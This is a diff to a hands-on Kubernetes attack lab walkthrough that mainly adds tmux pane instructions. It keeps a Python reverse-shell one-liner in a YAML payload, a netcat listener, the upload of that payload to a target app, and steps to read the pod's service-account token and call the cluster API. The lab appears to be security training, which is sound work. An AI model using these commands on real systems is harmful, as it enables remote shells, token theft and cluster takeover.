@@ -12,6 +12,9 @@
 cd /root/container_training/Kubernetes/K8s-Cluster-Attack
 ```
 
+* Multiplex terminal session with tmux, run: `tmux`
+
+
 ##### Step 2:
 
 
@@ -154,7 +157,11 @@ You should see a dump of all Environment variable on the container
 serverip
 ```
 
-* In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `Server-IP` with value of `serverip` fetched in the previous step.
+* In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `Server_IP_Here` with value of `serverip` fetched in the previous step.
+
+```bash
+sed -i -e 's/Server_IP_Here/<serverip>/g' reverse_shell.yml
+```
 
 EXAMPLE:
 
@@ -162,15 +169,19 @@ EXAMPLE:
 ["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]
 ```
 
-* Open a new tab on the terminal, access the server via. `ssh` and start your netcat listener
+* Create and split panes horizontally with `ctrl + b + Shift+"`
+
+* Ensure you're in low lower panel. If you are not, Run: `ctrl + b + (lower arrow key)`
+
+* Start netcat listener
 
 ```bash
-ssh root@ServerIp
-
 nc -l 1337
 ```
 
-* In the previous tab, post the malicious `reverse_shell.yml`.
+* Go to the upper pane with `ctrl + b + (upper arrow key)`
+
+* Post the malicious `reverse_shell.yml`.
 
 ```bash
 http --form POST $NGFLASK/upload file@reverse_shell.yml
@@ -208,6 +219,9 @@ Now you can interact with your target app and backend K8s cluster
 ##### Step 6:
 
 * In the reverse shell, navigate within the pod to fetch `Service Account` token.
+
+* To go to the lower pane with netcat reverse TCP shell, run `ctrl + b + (lower arrow key)`
+
 
 ```bash
 cd /run/secrets/kubernetes.io/serviceaccount
@@ -330,6 +344,8 @@ curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorizatio
 
 * In the other tab, navigate to `K8s-Cluster-Attack` directory and run the `tornado server`.
 
+* Go to the upper pane with `ctrl + b + (upper arrow key)`
+
 ```bash
 cd /root/container_training/Kubernetes/K8s-Cluster-Attack
 
@@ -350,10 +366,10 @@ cd /root/container_training/Kubernetes/K8s-Cluster-Attack
 kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis-deployment.yml
 ```
 
-* Check if any `pods` or `services` are running and delete them
+* Check if any `pods` are running and delete them
 
 ```bash
 kubectl get pods
 
-kubectl get svc
+kubectl delete pod mal-redis
 ```
